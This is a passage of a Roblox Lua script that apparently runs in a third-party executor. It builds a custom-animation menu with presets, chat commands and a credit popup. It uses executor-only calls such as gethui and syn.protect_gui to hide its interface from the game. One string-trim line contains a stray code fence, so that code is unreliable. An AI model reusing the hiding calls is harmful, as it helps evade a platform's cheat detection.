
local PresetHeader = Instance.new("TextLabel")
PresetHeader.Parent = EditorScroll
PresetHeader.LayoutOrder = 120
PresetHeader.BackgroundTransparency = 1
PresetHeader.Size = UDim2.new(1, -10, 0, 22)
PresetHeader.Font = Enum.Font.Arcade
PresetHeader.Text = "MY PRESETS"
PresetHeader.TextColor3 = Color3.fromRGB(100, 220, 255)
PresetHeader.TextSize = 14
PresetHeader.TextXAlignment = Enum.TextXAlignment.Left
PresetHeader.ZIndex = 6

local PresetListFrame = Instance.new("Frame")
PresetListFrame.Parent = EditorScroll
PresetListFrame.LayoutOrder = 121
PresetListFrame.Size = UDim2.new(1, -10, 0, 0)
PresetListFrame.AutomaticSize = Enum.AutomaticSize.Y
PresetListFrame.BackgroundTransparency = 1
PresetListFrame.ZIndex = 6

local PLL = Instance.new("UIListLayout")
PLL.Parent = PresetListFrame
PLL.SortOrder = Enum.SortOrder.Name
PLL.Padding = UDim.new(0, 4)

local function RefreshPresetList()
for _, ch in pairs(PresetListFrame:GetChildren()) do
if ch:IsA("Frame") or (ch:IsA("TextLabel") and ch.Name == "_Empty") then
ch:Destroy()
end
end

local count = 0
local sortedNames = {}
for n, _ in pairs(UserPresets) do
table.insert(sortedNames, n)
end
table.sort(sortedNames)

for idx, presetName in ipairs(sortedNames) do
count = count + 1
local PRow = Instance.new("Frame")
PRow.Parent = PresetListFrame
PRow.Name = "Preset_" .. presetName
PRow.Size = UDim2.new(1, 0, 0, 30)
PRow.BackgroundColor3 = Color3.fromRGB(35, 45, 65)
PRow.BorderSizePixel = 0
PRow.ZIndex = 6

local PRC = Instance.new("UICorner")
PRC.CornerRadius = UDim.new(0, 6)
PRC.Parent = PRow

local PName = Instance.new("TextLabel")
PName.Parent = PRow
PName.BackgroundTransparency = 1
PName.Position = UDim2.new(0, 8, 0, 0)
PName.Size = UDim2.new(1, -110, 1, 0)
PName.Font = Enum.Font.Antique
PName.Text = presetName
PName.TextColor3 = Color3.fromRGB(200, 240, 255)
PName.TextSize = 14
PName.TextXAlignment = Enum.TextXAlignment.Left
PName.ZIndex = 7

local LoadB = Instance.new("TextButton")
LoadB.Parent = PRow
LoadB.Size = UDim2.new(0, 46, 0, 22)
LoadB.Position = UDim2.new(1, -102, 0.5, -11)
LoadB.BackgroundColor3 = Color3.fromRGB(80, 180, 100)
LoadB.Text = "Use"
LoadB.Font = Enum.Font.Antique
LoadB.TextColor3 = Color3.fromRGB(255, 255, 255)
LoadB.TextSize = 13
LoadB.ZIndex = 7

local LBC = Instance.new("UICorner")
LBC.CornerRadius = UDim.new(0, 5)
LBC.Parent = LoadB

AddHapticToButton(LoadB, 0.7, 0.05)

LoadB.MouseButton1Click:Connect(function()
local data = UserPresets[presetName]
if data then
for _, key in ipairs(ANIM_KEYS) do
local val = data[key] or ""
val = tostring(val):gsub("rbxassetid://", "")
inputBoxes[key].Text = val
getgenv().CurrentCustomIDs[key] = val
end
getgenv().SwitchAnimationBundle(presetName)
LoadB.Text = "✓"
task.delay(0.8, function()
if LoadB and LoadB.Parent then LoadB.Text = "Use" end
end)
end
end)

local DelB = Instance.new("TextButton")
DelB.Parent = PRow
DelB.Size = UDim2.new(0, 46, 0, 22)
DelB.Position = UDim2.new(1, -52, 0.5, -11)
DelB.BackgroundColor3 = Color3.fromRGB(220, 80, 100)
DelB.Text = "Del"
DelB.Font = Enum.Font.Antique
DelB.TextColor3 = Color3.fromRGB(255, 255, 255)
DelB.TextSize = 13
DelB.ZIndex = 7

local DBC = Instance.new("UICorner")
DBC.CornerRadius = UDim.new(0, 5)
DBC.Parent = DelB

AddHapticToButton(DelB, 0.9, 0.08)

local confirmDelete = false
DelB.MouseButton1Click:Connect(function()
if not confirmDelete then
confirmDelete = true
DelB.Text = "Sure?"
DelB.BackgroundColor3 = Color3.fromRGB(255, 130, 60)
task.delay(2.5, function()
if DelB and DelB.Parent and confirmDelete then
confirmDelete = false
DelB.Text = "Del"
DelB.BackgroundColor3 = Color3.fromRGB(220, 80, 100)
end
end)
else
getgenv().DeleteCustomPreset(presetName)
RefreshPresetList()
end
end)
end

if count == 0 then
local EL = Instance.new("TextLabel")
EL.Parent = PresetListFrame
EL.Name = "_Empty"
EL.BackgroundTransparency = 1
EL.Size = UDim2.new(1, 0, 0, 24)
EL.Font = Enum.Font.Gotham
EL.Text = "( No presets yet )"
EL.TextColor3 = Color3.fromRGB(140, 150, 180)
EL.TextSize = 12
EL.ZIndex = 7
end
end

RefreshPresetList()

SaveBtn.MouseButton1Click:Connect(function()
local name = NameInput.Text:gsub("^%s+", ""):gsub("%s+```$", "")
if name == "" then
SaveBtn.Text = "Enter name!"
task.delay(1.2, function()
if SaveBtn and SaveBtn.Parent then SaveBtn.Text = "Save" end
end)
return
end

local data = GetInputData()
local ok = getgenv().SaveCustomPreset(name, data)
if ok then
PlayUISound("success")
SaveBtn.Text = "✓ Saved!"
NameInput.Text = ""
RefreshPresetList()
task.delay(1.2, function()
if SaveBtn and SaveBtn.Parent then SaveBtn.Text = "Save" end
end)
end
end)

local BackBtn = Instance.new("TextButton")
BackBtn.Parent = EditorScroll
BackBtn.LayoutOrder = 200
BackBtn.Size = UDim2.new(1, -10, 0, 32)
BackBtn.BackgroundColor3 = Color3.fromRGB(70, 80, 110)
BackBtn.Text = "◄ Back to Bundle List"
BackBtn.Font = Enum.Font.Antique
BackBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
BackBtn.TextSize = 15
BackBtn.AutoButtonColor = false
BackBtn.BorderSizePixel = 0
BackBtn.ZIndex = 7

local BBC = Instance.new("UICorner")
BBC.CornerRadius = UDim.new(0, 7)
BBC.Parent = BackBtn

AddHapticToButton(BackBtn, 0.7, 0.05)

BackBtn.MouseButton1Click:Connect(function()
GetInputData()
EditorFrame:Destroy()
if MainScrollFrame then
MainScrollFrame.Visible = true
end
end)

EditorFrame.BackgroundTransparency = 1
TweenService:Create(EditorFrame, TweenInfo.new(0.25), {BackgroundTransparency = 0.1}):Play()
end

-- MODIFIED: CreateHelpGui to prevent duplicates and improve visual theme
getgenv().CreateHelpGui = function()
local currentHelpGuiInstance = nil
local targetParent = nil
if gethui then targetParent = gethui()
elseif syn and syn.protect_gui then targetParent = CoreGui
else targetParent = LocalPlayer:WaitForChild("PlayerGui") end

currentHelpGuiInstance = targetParent:FindFirstChild("AnimationHelpGui")
if not currentHelpGuiInstance and targetParent ~= CoreGui then
currentHelpGuiInstance = CoreGui:FindFirstChild("AnimationHelpGui")
end
if not currentHelpGuiInstance and LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui") and targetParent ~= LocalPlayer:WaitForChild("PlayerGui") then
currentHelpGuiInstance = LocalPlayer.PlayerGui:FindFirstChild("AnimationHelpGui")
end

if currentHelpGuiInstance then
HelpGui = currentHelpGuiInstance
local mainFrame = HelpGui:FindFirstChild("Main")
if mainFrame then
if mainFrame.BackgroundTransparency >= 0.9 then
PlayUISound("open")
TriggerSatisfyingHaptic(0.8, 0.05)
mainFrame.Visible = true
TweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
Size = UDim2.new(0, 260, 0, 360),
Position = UDim2.new(0.5, -130, 0.5, -180),
BackgroundTransparency = 0
}):Play()
CreateMobileFloatingIcon()
else
PlayUISound("open")
TriggerSatisfyingHaptic(0.5, 0.03)
end

-- Re-establish connections
local mainStroke = mainFrame:FindFirstChild("MainStroke")
if mainStroke and mainStroke:FindFirstChildOfClass("UIGradient") then
if BorderRainbowConnection then BorderRainbowConnection:Disconnect() end
BorderRainbowConnection = RunService.RenderStepped:Connect(function()
if mainStroke and mainStroke.Parent and mainStroke:FindFirstChildOfClass("UIGradient") then
mainStroke.UIGradient.Rotation = (tick() * 40) % 360
else
if BorderRainbowConnection then BorderRainbowConnection:Disconnect() BorderRainbowConnection = nil end
end
end)
end

local scrollFrame = mainFrame:FindFirstChild("ScrollFrame")
if scrollFrame then
local KatButton = nil
for _, child in pairs(scrollFrame:GetChildren()) do
if child:IsA("TextButton") and child:GetAttribute("BundleName") == "Kat" then
KatButton = child
break
end
end
if KatButton then
if KatRainbowConnection then KatRainbowConnection:Disconnect() end
KatRainbowConnection = RunService.RenderStepped:Connect(function()
if KatButton and KatButton.Parent then
local hue1 = (tick() * 0.5) % 1
local color1 = Color3.fromHSV(hue1, 0.9, 1)
local hue2 = (tick() * 0.7 + 0.4) % 1
local color2 = Color3.fromHSV(hue2, 0.9, 1)
KatButton.Text = string.format(
'<font color="rgb(%d,%d,%d)">Kat</font> <font color="rgb(%d,%d,%d)">[NEW]</font>',
math.floor(color1.R * 255), math.floor(color1.G * 255), math.floor(color1.B * 255),
math.floor(color2.R * 255), math.floor(color2.G * 255), math.floor(color2.B * 255)
)
else
if KatRainbowConnection then KatRainbowConnection:Disconnect() KatRainbowConnection = nil end
end
end)
end
end
return
else
currentHelpGuiInstance:Destroy()
HelpGui = nil
HideMobileFloatingIcon()
end
end

PlayUISound("open")
TriggerSatisfyingHaptic(1, 0.1)

CreateMobileFloatingIcon()

HelpGui = Instance.new("ScreenGui")
HelpGui.Name = "AnimationHelpGui"
HelpGui.ResetOnSpawn = false
HelpGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
HelpGui.Parent = targetParent

local Main = Instance.new("Frame")
Main.Name = "Main"
Main.Parent = HelpGui
Main.Size = UDim2.new(0, 260, 0, 360)
Main.Position = UDim2.new(0.5, -130, 0.5, -180)
Main.BackgroundColor3 = Color3.fromRGB(18, 15, 30) -- Darker Neon Background
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true
Main.ClipsDescendants = false

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 12)
MainCorner.Parent = Main

AddDropShadow(Main, 25, 0.6) -- Add Modern Shadow to GUI

local MainGradient = Instance.new("UIGradient")
MainGradient.Parent = Main
MainGradient.Color = ColorSequence.new({
ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 25, 60)),
ColorSequenceKeypoint.new(0.5, Color3.fromRGB(22, 18, 38)),
ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 12, 25))
})
MainGradient.Rotation = 135

local MainStroke = Instance.new("UIStroke")
MainStroke.Name = "MainStroke"
MainStroke.Color = Color3.fromRGB(255, 100, 200)
MainStroke.Thickness = 2.5 -- Slightly thicker stroke
MainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
MainStroke.Parent = Main

local StrokeGradient = Instance.new("UIGradient")
StrokeGradient.Parent = MainStroke
StrokeGradient.Color = ColorSequence.new({
ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 80, 150)),
ColorSequenceKeypoint.new(0.33, Color3.fromRGB(100, 180, 255)),
ColorSequenceKeypoint.new(0.66, Color3.fromRGB(50, 255, 180)),
ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 200, 80))
})

if BorderRainbowConnection then BorderRainbowConnection:Disconnect() end
BorderRainbowConnection = RunService.RenderStepped:Connect(function()
if MainStroke and MainStroke.Parent and MainStroke:FindFirstChildOfClass("UIGradient") then
MainStroke.UIGradient.Rotation = (tick() * 50) % 360
else
if BorderRainbowConnection then BorderRainbowConnection:Disconnect() BorderRainbowConnection = nil end
end
end)

local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Parent = Main
TitleBar.Size = UDim2.new(1, 0, 0, 44)
TitleBar.BackgroundColor3 = Color3.fromRGB(45, 30, 80)
TitleBar.BorderSizePixel = 0

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 12)
TitleCorner.Parent = TitleBar

local TitleGradient = Instance.new("UIGradient")
TitleGradient.Parent = TitleBar
TitleGradient.Color = ColorSequence.new({
ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 40, 150)),
ColorSequenceKeypoint.new(0.5, Color3.fromRGB(50, 50, 140)),
ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 80, 180))
})

local TitleFix = Instance.new("Frame")
TitleFix.Parent = TitleBar
TitleFix.Size = UDim2.new(1, 0, 0.5, 0)
TitleFix.Position = UDim2.new(0, 0, 0.5, 0)
TitleFix.BackgroundColor3 = Color3.fromRGB(40, 65, 160)
TitleFix.BorderSizePixel = 0

local TitleUnderline = Instance.new("Frame")
TitleUnderline.Parent = Main
TitleUnderline.Size = UDim2.new(1, -20, 0, 2)
TitleUnderline.Position = UDim2.new(0, 10, 0, 44)
TitleUnderline.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleUnderline.BorderSizePixel = 0

local UnderlineGrad = Instance.new("UIGradient")
UnderlineGrad.Parent = TitleUnderline
UnderlineGrad.Color = ColorSequence.new({
ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 100, 200)),
ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 200, 255)),
ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 200, 100))
})

local TitleText = Instance.new("TextLabel")
TitleText.Parent = TitleBar
TitleText.BackgroundTransparency = 1
TitleText.Size = UDim2.new(1, -80, 1, 0)
TitleText.Position = UDim2.new(0, 14, 0, 0)
TitleText.Font = Enum.Font.Fantasy
TitleText.Text = "Animation Menu"
TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleText.TextSize = 20
TitleText.TextXAlignment = Enum.TextXAlignment.Left

local CloseBtn = Instance.new("TextButton")
CloseBtn.Parent = TitleBar
CloseBtn.Size = UDim2.new(0, 32, 0, 32)
CloseBtn.Position = UDim2.new(1, -38, 0.5, -16)
CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 60, 80)
CloseBtn.Text = "X"
CloseBtn.Font = Enum.Font.Antique
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.TextSize = 20
CloseBtn.AutoButtonColor = false
CloseBtn.BorderSizePixel = 0

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 8)
CloseCorner.Parent = CloseBtn

AddHapticToButton(CloseBtn, 1, 0.08)

-- FIX: Close button destroys BOTH GUI and Floating Icon
CloseBtn.MouseButton1Click:Connect(function()
PlayUISound("close")
TriggerSatisfyingHaptic(1, 0.08)

if KatRainbowConnection then KatRainbowConnection:Disconnect() KatRainbowConnection = nil end
if BorderRainbowConnection then BorderRainbowConnection:Disconnect() BorderRainbowConnection = nil end

if HelpGui then
local closeTween = TweenService:Create(Main, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
Size = UDim2.new(0, 240, 0, 340),
Position = UDim2.new(0.5, -120, 0.5, -170),
BackgroundTransparency = 1
})
closeTween:Play()

if MainStroke then TweenService:Create(MainStroke, TweenInfo.new(0.2), {Transparency = 1}):Play() end
if TitleBar then TweenService:Create(TitleBar, TweenInfo.new(0.2), {BackgroundTransparency = 1}):Play() end

closeTween.Completed:Connect(function()
if HelpGui then
HelpGui:Destroy()
HelpGui = nil
HideMobileFloatingIcon() -- Hides floating icon ONLY when X is clicked
end
end)
end
end)

local InfoLabel = Instance.new("TextLabel")
InfoLabel.Parent = Main
InfoLabel.BackgroundTransparency = 1
InfoLabel.Size = UDim2.new(1, -20, 0, 18)
InfoLabel.Position = UDim2.new(0, 12, 0, 48)
InfoLabel.Font = Enum.Font.Arcade
InfoLabel.Text = "Tap to Apply"
InfoLabel.TextColor3 = Color3.fromRGB(255, 220, 130)
InfoLabel.TextSize = 13
InfoLabel.TextXAlignment = Enum.TextXAlignment.Left

local ScrollFrame = Instance.new("ScrollingFrame")
ScrollFrame.Name = "ScrollFrame"
ScrollFrame.Parent = Main
ScrollFrame.Size = UDim2.new(1, -12, 1, -76)
ScrollFrame.Position = UDim2.new(0, 6, 0, 70)
ScrollFrame.BackgroundColor3 = Color3.fromRGB(15, 12, 28)
ScrollFrame.BackgroundTransparency = 0.2
ScrollFrame.BorderSizePixel = 0
ScrollFrame.ScrollBarThickness = 5
ScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(180, 100, 255)
ScrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y

local ScrollCorner = Instance.new("UICorner")
ScrollCorner.CornerRadius = UDim.new(0, 10)
ScrollCorner.Parent = ScrollFrame

local UIList = Instance.new("UIListLayout")
UIList.Parent = ScrollFrame
UIList.SortOrder = Enum.SortOrder.LayoutOrder
UIList.Padding = UDim.new(0, 6)

local UIPad = Instance.new("UIPadding")
UIPad.Parent = ScrollFrame
UIPad.PaddingTop = UDim.new(0, 8)
UIPad.PaddingLeft = UDim.new(0, 8)
UIPad.PaddingRight = UDim.new(0, 8)
UIPad.PaddingBottom = UDim.new(0, 8)

local bundleList = {}
for name, _ in pairs(MasterBundles) do
if name:lower() ~= "custom" and name ~= "_TempCustom" and not UserPresets[name] then
table.insert(bundleList, name)
end
end
table.sort(bundleList)

local specialButtons = {
{name = "Custom Animation IDs", cmd = "editor", c1 = Color3.fromRGB(255, 160, 70), order = 1},
{name = "Hybrid Custom Mode", cmd = "custom", c1 = Color3.fromRGB(180, 80, 255), order = 2},
{name = "Stop Animation", cmd = "stop", c1 = Color3.fromRGB(255, 80, 90), order = 3},
{name = "Start Animation", cmd = "start", c1 = Color3.fromRGB(80, 220, 130), order = 4},
}

for _, data in ipairs(specialButtons) do
local Btn = Instance.new("TextButton")
Btn.Parent = ScrollFrame
Btn.LayoutOrder = data.order
Btn.Size = UDim2.new(1, -10, 0, 38)
Btn.BackgroundColor3 = data.c1
Btn.Text = data.name
Btn.Font = Enum.Font.Antique
Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
Btn.TextSize = 18
Btn.AutoButtonColor = false
Btn.BorderSizePixel = 0

local BtnC = Instance.new("UICorner")
BtnC.CornerRadius = UDim.new(0, 8)
BtnC.Parent = Btn

AddHapticToButton(Btn, 1, 0.1)

Btn.MouseButton1Click:Connect(function()
if data.cmd == "editor" then
ScrollFrame.Visible = false
OpenCustomEditor(Main, ScrollFrame)
elseif data.cmd == "custom" then
getgenv().ToggleHybridMode(true)
RefreshHighlights(ScrollFrame)
elseif data.cmd == "stop" then
if IsActive then
IsActive = false
if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
StopAllAnimations(LocalPlayer.Character.Humanoid)
end
print("Custom Animations Deactivated.")
end
elseif data.cmd == "start" then
IsActive = true
if LocalPlayer.Character then UpdateAnims(LocalPlayer.Character) end
end
end)
end

local KatButton = nil

for i, bundleName in ipairs(bundleList) do
local Btn = Instance.new("TextButton")
Btn.Parent = ScrollFrame
Btn.LayoutOrder = 20 + i
Btn.Size = UDim2.new(1, -10, 0, 32)
Btn.BackgroundColor3 = Color3.fromRGB(40, 45, 65)
Btn.Font = Enum.Font.Antique
Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
Btn.TextSize = 17
Btn.AutoButtonColor = false
Btn.BorderSizePixel = 0
Btn.RichText = true
Btn:SetAttribute("BundleName", bundleName)

if bundleName == "Kat" then
KatButton = Btn
else
Btn.Text = bundleName
end

local BtnC = Instance.new("UICorner")
BtnC.CornerRadius = UDim.new(0, 7)
BtnC.Parent = Btn

local isSelected = (bundleName == getgenv().ChosenBundleName) and (not getgenv().EnableHybridCustom)
if isSelected then
UpdateBundleButton(Btn, bundleName, true)
end

AddHapticToButton(Btn, 0.7, 0.05)

Btn.MouseButton1Click:Connect(function()
getgenv().SwitchAnimationBundle(bundleName)
RefreshHighlights(ScrollFrame)
end)
end

if KatButton then
if KatRainbowConnection then KatRainbowConnection:Disconnect() end
KatRainbowConnection = RunService.RenderStepped:Connect(function()
if not KatButton or not KatButton.Parent then
if KatRainbowConnection then KatRainbowConnection:Disconnect() KatRainbowConnection = nil end
return
end
local hue1 = (tick() * 0.5) % 1
local color1 = Color3.fromHSV(hue1, 0.9, 1)
local hue2 = (tick() * 0.7 + 0.4) % 1
local color2 = Color3.fromHSV(hue2, 0.9, 1)
KatButton.Text = string.format(
'<font color="rgb(%d,%d,%d)">Kat</font> <font color="rgb(%d,%d,%d)">[NEW]</font>',
math.floor(color1.R * 255), math.floor(color1.G * 255), math.floor(color1.B * 255),
math.floor(color2.R * 255), math.floor(color2.G * 255), math.floor(color2.B * 255)
)
end)
end

Main.Size = UDim2.new(0, 240, 0, 340)
Main.Position = UDim2.new(0.5, -120, 0.5, -170)
Main.BackgroundTransparency = 1

TweenService:Create(Main, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
Size = UDim2.new(0, 260, 0, 360),
Position = UDim2.new(0.5, -130, 0.5, -180),
BackgroundTransparency = 0
}):Play()
end

LocalPlayer.Chatted:Connect(function(message)
local lowerMsg = message:lower()
local parts = string.split(lowerMsg, " ")

if parts[1] == "/e" and parts[2] == "help" then
getgenv().CreateHelpGui()
elseif parts[1] == "/e" and parts[2] == "stop" then
if IsActive then
IsActive = false
if LocalPlayer.Character and LocalPlayer.Character.Humanoid then
StopAllAnimations(LocalPlayer.Character.Humanoid)
end
print("Custom Animations Deactivated.")
end
elseif parts[1] == "/e" and parts[2] == "start" then
if not IsActive then
IsActive = true
if LocalPlayer.Character then UpdateAnims(LocalPlayer.Character) end
end
elseif parts[1] == "/e" and parts[2] == "custom" then
getgenv().ToggleHybridMode(true)
elseif parts[1] == "/e" and parts[2] then
getgenv().SwitchAnimationBundle(parts[2])
end
end)

print("Script Loaded! Type '/e help' to open animation menu.")
end

-- ==============================================================================
-- 4. NOTIFICATION SYSTEM
-- ==============================================================================
-- ============================================================
-- Mautiku Notification Script with Animated Rainbow Text & Bouncy Wiggle
-- Font: Enum.Font.FredokaOne
-- ============================================================

local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")

local CONFIG_FILE = "Mautiku_Message_Config.json"

local function checkConfig()
if isfile and isfile(CONFIG_FILE) then
local success, result = pcall(function()
return HttpService:JSONDecode(readfile(CONFIG_FILE))
end)
if success and result and result.DontShowAgain == true then
return true
end
end
return false
end

if checkConfig() then
print("Mautiku Message skipped (User selected 'Don't show again')")
return
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "MautikuNotification"

if gethui then
ScreenGui.Parent = gethui()
elseif syn and syn.protect_gui then
syn.protect_gui(ScreenGui)
ScreenGui.Parent = CoreGui
else
ScreenGui.Parent = CoreGui
end

local TargetPosition = UDim2.new(1, -20, 1, -150)

local TrailerLabel = Instance.new("TextLabel")
TrailerLabel.Name = "TrailerLabel"
TrailerLabel.Parent = ScreenGui
TrailerLabel.BackgroundTransparency = 1
TrailerLabel.Text = "YT: SussyXDD"
TrailerLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
TrailerLabel.Font = Enum.Font.GothamBlack
TrailerLabel.TextSize = 16
TrailerLabel.TextStrokeTransparency = 0.3
TrailerLabel.TextStrokeColor3 = Color3.fromRGB(20, 15, 30)
TrailerLabel.AnchorPoint = Vector2.new(1, 0.5)
TrailerLabel.Size = UDim2.new(0, 120, 0, 20)
TrailerLabel.Position = UDim2.new(1, -290, 1, -80)
TrailerLabel.TextTransparency = 1

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 22, 35)
MainFrame.Position = UDim2.new(1, 280, 1, -150)
MainFrame.Size = UDim2.new(0, 260, 0, 140)
MainFrame.BorderSizePixel = 0
MainFrame.AnchorPoint = Vector2.new(1, 1)

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = MainFrame

local UIStroke = Instance.new("UIStroke")
UIStroke.Parent = MainFrame
UIStroke.Color = Color3.fromRGB(150, 100, 255)
UIStroke.Thickness = 1.5
UIStroke.Transparency = 0.3

local Shadow = Instance.new("ImageLabel")
Shadow.Name = "DropShadow"
Shadow.Parent = MainFrame
Shadow.BackgroundTransparency = 1
Shadow.Image = "rbxassetid://6015897843"
Shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
Shadow.ImageTransparency = 0.5
Shadow.ScaleType = Enum.ScaleType.Slice
Shadow.SliceCenter = Rect.new(49, 49, 450, 450)
Shadow.Size = UDim2.new(1, 30, 1, 30)
Shadow.Position = UDim2.new(0, -15, 0, -15)
Shadow.ZIndex = -1

local Title = Instance.new("TextLabel")
Title.Parent = MainFrame
Title.BackgroundTransparency = 1
Title.Position = UDim2.new(0, 15, 0, 10)
Title.Size = UDim2.new(1, -30, 0, 20)
Title.Font = Enum.Font.GothamBold
Title.Text = "Message from Mautiku:"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 14
Title.TextXAlignment = Enum.TextXAlignment.Left

local Message = Instance.new("TextLabel")
Message.Parent = MainFrame
Message.BackgroundTransparency = 1
Message.Position = UDim2.new(0, 15, 0, 35)
Message.Size = UDim2.new(1, -30, 0, 35)
Message.Font = Enum.Font.FredokaOne
Message.TextColor3 = Color3.fromRGB(220, 220, 220)
Message.TextSize = 14
Message.TextWrapped = true
Message.TextXAlignment = Enum.TextXAlignment.Left
Message.RichText = true

local function rainbowize(text, offset)
offset = offset or 0
local result = ""
local len = utf8.len(text) or #text
local i = 1
for p, c in utf8.codes(text) do
local char = utf8.char(c)
if char == " " then
result = result .. " "
else
local hue = ((i - 1) / math.max(len, 1) + offset) % 1
local color = Color3.fromHSV(hue, 0.9, 1)
local hex = string.format("#%02X%02X%02X", math.floor(color.R * 255), math.floor(color.G * 255), math.floor(color.B * 255))
result = result .. string.format('<font color="%s">%s</font>', hex, char)
end
i = i + 1
end
return result
end

task.spawn(function()
Message.Text = ""
local pfx = "Updated "
local w1 = "Custom IDs"
local mid = " type "
local w2 = "/e help"
local sfx = " to see the gui"
local offset = 0
local speedDelay = 0.035 / 1

local currPfx = ""
for _, c in utf8.codes(pfx) do
currPfx = currPfx .. utf8.char(c)
Message.Text = currPfx
task.wait(speedDelay)
end

local w1Len = utf8.len(w1) or #w1
for i = 1, w1Len do
local subW1 = string.sub(w1, 1, i)
Message.Text = currPfx .. rainbowize(subW1, offset)
task.wait(speedDelay)
end

local currMid = ""
for _, c in utf8.codes(mid) do
currMid = currMid .. utf8.char(c)
Message.Text = currPfx .. rainbowize(w1, offset) .. currMid
task.wait(speedDelay)
end

local w2Len = utf8.len(w2) or #w2
for i = 1, w2Len do
local subW2 = string.sub(w2, 1, i)
Message.Text = currPfx .. rainbowize(w1, offset) .. mid .. rainbowize(subW2, offset + 0.3)
task.wait(speedDelay)
end

local currSfx = ""
for _, c in utf8.codes(sfx) do
currSfx = currSfx .. utf8.char(c)
Message.Text = currPfx .. rainbowize(w1, offset) .. mid .. rainbowize(w2, offset + 0.3) .. currSfx
task.wait(speedDelay)
end

while ScreenGui and ScreenGui.Parent do
offset = (offset + 0.02) % 1
local rw1 = rainbowize(w1, offset)
local rw2 = rainbowize(w2, offset + 0.3)
Message.Text = pfx .. rw1 .. mid .. rw2 .. sfx
task.wait(0.03)
end
end)

local CheckboxFrame = Instance.new("Frame")
CheckboxFrame.Parent = MainFrame
CheckboxFrame.BackgroundTransparency = 1
CheckboxFrame.Position = UDim2.new(0, 15, 0, 78)
CheckboxFrame.Size = UDim2.new(1, -30, 0, 20)

local CheckboxBtn = Instance.new("ImageButton")
CheckboxBtn.Parent = CheckboxFrame
CheckboxBtn.BackgroundColor3 = Color3.fromRGB(40, 42, 55)
CheckboxBtn.Size = UDim2.new(0, 18, 0, 18)
CheckboxBtn.AutoButtonColor = false

local CheckCorner = Instance.new("UICorner")
CheckCorner.CornerRadius = UDim.new(0, 4)
CheckCorner.Parent = CheckboxBtn

local CheckStroke = Instance.new("UIStroke")
CheckStroke.Parent = CheckboxBtn
CheckStroke.Color = Color3.fromRGB(100, 110, 150)
CheckStroke.Thickness = 1

local CheckIcon = Instance.new("ImageLabel")
CheckIcon.Parent = CheckboxBtn
CheckIcon.BackgroundTransparency = 1
CheckIcon.Image = "rbxassetid://6031094667"
CheckIcon.Size = UDim2.new(0.8, 0, 0.8, 0)
CheckIcon.Position = UDim2.new(0.1, 0, 0.1, 0)
CheckIcon.ImageTransparency = 1

local CheckLabel = Instance.new("TextLabel")
CheckLabel.Parent = CheckboxFrame
CheckLabel.BackgroundTransparency = 1
CheckLabel.Position = UDim2.new(0, 28, 0, 0)
CheckLabel.Size = UDim2.new(0, 120, 1, 0)
CheckLabel.Font = Enum.Font.Gotham
CheckLabel.Text = "Don't show again"
CheckLabel.TextColor3 = Color3.fromRGB(160, 160, 180)
CheckLabel.TextSize = 12
CheckLabel.TextXAlignment = Enum.TextXAlignment.Left

local isDontShowSelected = false

CheckboxBtn.MouseButton1Click:Connect(function()
isDontShowSelected = not isDontShowSelected
if isDontShowSelected then
TweenService:Create(CheckIcon, TweenInfo.new(0.2), {ImageTransparency = 0}):Play()
TweenService:Create(CheckboxBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(130, 80, 255)}):Play()
TweenService:Create(CheckStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(180, 130, 255)}):Play()
else
TweenService:Create(CheckIcon, TweenInfo.new(0.2), {ImageTransparency = 1}):Play()
TweenService:Create(CheckboxBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(40, 42, 55)}):Play()
TweenService:Create(CheckStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(100, 110, 150)}):Play()
end
end)

local OkButton = Instance.new("TextButton")
OkButton.Parent = MainFrame
OkButton.BackgroundColor3 = Color3.fromRGB(240, 240, 255)
OkButton.Position = UDim2.new(1, -75, 1, -35)
OkButton.Size = UDim2.new(0, 60, 0, 25)
OkButton.Font = Enum.Font.GothamBold
OkButton.Text = "Ok"
OkButton.TextColor3 = Color3.fromRGB(20, 15, 30)
OkButton.TextSize = 12
